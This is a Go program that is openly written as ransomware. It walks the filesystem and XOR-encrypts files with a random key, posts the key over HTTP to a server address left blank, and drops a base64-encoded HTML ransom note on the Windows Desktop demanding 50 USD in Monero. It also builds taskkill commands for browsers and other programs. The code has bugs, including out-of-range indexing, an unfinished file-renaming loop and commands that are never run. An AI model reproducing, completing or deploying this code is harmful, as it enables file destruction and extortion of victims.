package main

import (
	"bytes"
	"encoding/base64"
	"github.com/thanhpk/randstr"
	"io/fs"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

func main() {
	time.Sleep(48)
	Encrypt()
	showMssg()
}

func Encrypt() {
	var filesoo []string
	var count int
	var sizeofile []int
	files := filepath.Walk("", filepath.WalkFunc(func(path string, info fs.FileInfo, err error) error {
		filesoo = append(filesoo, path)
		sizeofile = append(sizeofile, int(info.Size()))
		return err
	}))
	files.Error()
	key := randstr.Bytes(200)
	for i := range filesoo {
		if strings.Contains(filesoo[i], ".sys") || strings.Contains(filesoo[i], ".dll") || strings.Contains(filesoo[i], ".exe") {
			continue
		}
		j, err := os.OpenFile(filesoo[i], os.O_RDONLY, 0755)
		if err != nil {
			return
		}
		filedata := make([]byte, sizeofile[i])
		_, err999 := j.Read(filedata)
		if err999 != nil {
			return
		}
		for k := len(filedata); k > 0; k-- {
			if k > len(key) {
				if count > len(key) {
					count = 0
				}
				filedata[k] = filedata[k] ^ key[count]
				count++
			}
			filedata[k] = filedata[k] ^ key[k]
		}
		kkkkkkkkkkkk := j.Close()
		if kkkkkkkkkkkk != nil {
			return
		}
		bbb := os.WriteFile(filesoo[i], filedata, 0755)
		if bbb != nil {
			return
		}
		char := []rune(filesoo[i])
		for name := len(filesoo[i]); name > 0; name-- {
			if string(char[name]) == "." {
				dista := name - len(filesoo[i])
				distance := dista / -1
				for lolol := 0; lolol < distance; distance-- {
					// extension not finished
				}
			}
		}
		filedata = nil
	}
	sendtoServer("", key)
}

func showMssg() {
	var EncodedMsg = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+UmVhZC1DYXJlZnVsbHkhPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KPHA+QWxsIG9mIHlvdXIgaW1wb3J0YW50IGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhClBheSA1MCBVU0QgaW4gbW9uZXJvIGFuZCBnZXQgdGhlIGtleSEKSWYgeW91J3ZlIGp1c3QgY2xvc2VkIHRoZSBwcm9tcHQgd2l0aCB0aGUgY29kZSB0byByZWNlaXZlIHRoZSBiaW5hcnkocHJvZ3JhbSkgdG8gZGVjcnlwdCB5b3VyIGltcG9ydGFudCBmaWxlcyBhZnRlciB5b3UgcGF5ZWQsCkRvbnQndCB3b3JyeSBqdXN0IG9wZW4gaXQgYWdhaW4gZnJvbSB0aGUgZGVza3RvcCBpdCdzIHlvdXIgdW5pcXVlIGlkZW50aWZpeWluZyBudW1iZXIgZG9uJ3QgbG9vc2UgaXQhCmlmIHlvdSBkb24ndCBob3cgdGhlIGdldCBtb25lcm8gaGVyZSB5b3UgZ28hIC0+PC9wPgo8YSBocmVmID0gImh0dHBzOi8vd3d3LmdldG1vbmVyby5vcmcvIiA+PC9hPgo8cD5XaGVuIHlvdSBwYXkgdGhlIDUwJCBsZWF2ZSBhIG5vdGUgd2l0aCB0aGUgdW5pcXVlIGlkZW50aWZ5aW5nIG51bWJlciB5b3UndmUgZ290IGFuZCB5b3VyJ2VtYWlsIHlvdSdsbCBiZSBzZW5kIHRoZSBwcm9ncmFtPC9wPgo8L2JvZHk+CjwvaHRtbD4=" /*html ransom message*/
	DecodedMsg, yo := base64.StdEncoding.DecodeString(EncodedMsg)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               // decoding base64 encoded html ransom message
	if yo != nil {
		return
	}
	file, err55 := os.OpenFile("C:\\Users\\"+getuser()+"\\Desktop\\rnRaNo.html", os.O_RDWR|os.O_CREATE, 0755)
	if err55 != nil {
		return
	}
	_, err := file.WriteString(string(DecodedMsg))
	if err != nil {
		return
	}
	err87 := file.Close()
	if err87 != nil {
		return
	}
	exec.Command("taskkill", "/IM", "chrome.exe")
	exec.Command("taskkill", "/IM", "firefox.exe")
	exec.Command("taskkill", "/IM", "steam.exe")
	exec.Command("taskkill", "/IM", "notepad.exe")
	exec.Command("msedge.exe", "C:\\Users\\"+getuser()+"\\Desktop\\rnRano.html")
}

func getuser() string {
	lambda, err := user.Current()
	if err != nil {
		panic("!")
	}
	username := lambda.Username
	return username
}

func sendtoServer(adress string, xorkey []byte) {
	httpc := http.Client{}
	bytetoioreader := bytes.NewReader(xorkey)
	_, err := httpc.Post(adress, "Byte", bytetoioreader)
	if err != nil {
		return
	}
}
